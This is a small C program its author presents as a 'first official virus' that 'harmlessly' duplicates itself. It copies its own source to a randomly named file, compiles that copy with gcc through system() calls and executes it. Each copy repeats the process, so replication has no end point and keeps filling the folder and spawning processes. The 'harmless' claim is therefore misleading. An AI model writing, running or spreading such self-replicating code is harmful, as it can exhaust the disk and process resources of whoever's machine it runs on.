#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

//first official 'virus.' Harmlessly duplicates itself within a single folder, on any linux system that has gcc installed and linked to PATH

int main() {

	FILE* thisfile;
	FILE* targfile;
	char buffer[500];
	char comstring[100];
	char title[30];
	int i;
	srand(time(NULL));
	i = rand();
	snprintf(title, sizeof(title), "evilvirus%d.c", rand());
	thisfile = fopen(__FILE__, "r");
	targfile = fopen(title, "w");
	while (fgets(buffer, sizeof(buffer), thisfile) != NULL)
		fprintf(targfile, "%s", buffer);
	fclose(thisfile);
	fclose(targfile);
	snprintf(comstring, sizeof(comstring), "gcc -o %d %s", i, title);
	system(comstring);
	snprintf(comstring, sizeof(comstring), "./%d", i);
	sleep(2);
	system(comstring);
	return 0;

}
